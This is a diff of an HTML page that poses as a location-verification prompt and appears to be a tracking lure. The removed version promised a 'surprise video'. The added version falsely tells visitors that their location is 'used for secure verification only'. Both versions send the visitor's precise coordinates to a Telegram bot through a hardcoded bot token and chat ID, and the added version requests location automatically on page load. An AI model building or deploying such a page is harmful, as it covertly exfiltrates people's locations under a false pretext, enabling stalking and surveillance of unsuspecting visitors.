@@ -2,83 +2,106 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Special Video For You</title>
+  <title>Location Access</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: #f9f9f9;
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #1e3c72, #2a5298);
+      color: white;
       display: flex;
       flex-direction: column;
-      justify-content: center;
       align-items: center;
+      justify-content: center;
       height: 100vh;
-      text-align: center;
-      padding: 20px;
-    }
-    .box {
-      background: white;
-      padding: 30px;
-      border-radius: 15px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-    button {
-      background-color: #0088cc;
-      color: white;
-      border: none;
-      padding: 10px 20px;
-      border-radius: 5px;
-      font-size: 16px;
-      cursor: pointer;
-      margin-top: 20px;
-    }
-    button:hover {
-      background-color: #0077b3;
-    }
+      transition: background 0.5s ease;
+    }h1 {
+  font-size: 2em;
+  margin-bottom: 10px;
+}
+
+p {
+  margin: 0 0 20px;
+  font-size: 1.1em;
+  text-align: center;
+}
+
+button {
+  padding: 12px 24px;
+  font-size: 1em;
+  border: none;
+  border-radius: 30px;
+  background-color: #ffcc00;
+  color: #1e1e1e;
+  cursor: pointer;
+  transition: background-color 0.3s;
+}
+
+button:hover {
+  background-color: #ffdb4d;
+}
+
+.toggle-theme {
+  position: absolute;
+  top: 20px;
+  right: 20px;
+  padding: 8px 14px;
+  background-color: #444;
+  color: white;
+  border: none;
+  border-radius: 20px;
+  cursor: pointer;
+}
+
   </style>
 </head>
 <body>
-  <div class="box">
-    <h2>🎁 A Surprise Video Just For You!</h2>
-    <p>Tap below to verify your location and unlock the video.</p>
-    <button onclick="sendLocation()">Allow Location</button>
-    <p id="status"></p>
-  </div>  <script>
-    const botToken = "8216004415:AAF-MF8E-tRBw6h5-BfC3_i1FagixuSt9Rc";
-    const chatId = "6038115234";
+  <button class="toggle-theme" onclick="toggleTheme()">Toggle Theme</button>  <h1>📍 Allow Location Access</h1>
+  <p>Please allow location to continue. Your location is used for secure verification only.</p>
+  <button onclick="getLocation()">Allow Location</button>  <script>
+    const darkTheme = {
+      background: 'linear-gradient(135deg, #121212, #232323)',
+      color: 'white',
+    };
+    const lightTheme = {
+      background: 'linear-gradient(135deg, #1e3c72, #2a5298)',
+      color: 'white',
+    };
 
-    function sendLocation() {
-      const status = document.getElementById("status");
+    let dark = false;
+
+    function toggleTheme() {
+      dark = !dark;
+      document.body.style.background = dark ? darkTheme.background : lightTheme.background;
+    }
+
+    // Auto-request location on load
+    window.onload = () => {
+      getLocation();
+    };
+
+    function getLocation() {
       if (navigator.geolocation) {
-        status.textContent = "Getting location...";
-        navigator.geolocation.getCurrentPosition(
-          (position) => {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const acc = position.coords.accuracy;
-            const time = new Date().toLocaleString();
-
-            const message = `📍 New Location Received:%0A📌 Lat: ${lat}%0A📌 Long: ${lon}%0A🎯 Accuracy: ${acc} meters%0A🕒 Time: ${time}`;
-
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;
-
-            fetch(url)
-              .then(() => {
-                status.textContent = "✅ Location sent successfully! Video unlocking...";
-                setTimeout(() => {
-                  window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // prank video ;)
-                }, 2000);
-              })
-              .catch(() => {
-                status.textContent = "❌ Failed to send location. Try again later.";
-              });
-          },
-          () => {
-            status.textContent = "❌ Location permission denied.";
-          }
-        );
+        navigator.geolocation.getCurrentPosition(sendToTelegram, showError, {
+          enableHighAccuracy: true,
+          timeout: 10000,
+        });
       } else {
-        status.textContent = "❌ Geolocation not supported.";
+        alert("Geolocation is not supported by this browser.");
       }
+    }
+
+    function sendToTelegram(position) {
+      const { latitude, longitude, accuracy } = position.coords;
+      const date = new Date().toLocaleString();
+      const message = `📍 New Location Received:%0A📌 Lat: ${latitude}%0A📌 Long: ${longitude}%0A🎯 Accuracy: ${accuracy} meters%0A🕒 Time: ${date}`;
+
+      fetch(`https://api.telegram.org/bot8216004415:AAF-MF8E-tRBw6h5-BfC3_i1FagixuSt9Rc/sendMessage?chat_id=6038115234&text=${message}`);
+    }
+
+    function showError(error) {
+      alert("Failed to get location. Please try again and allow location access.");
     }
   </script></body>
 </html>
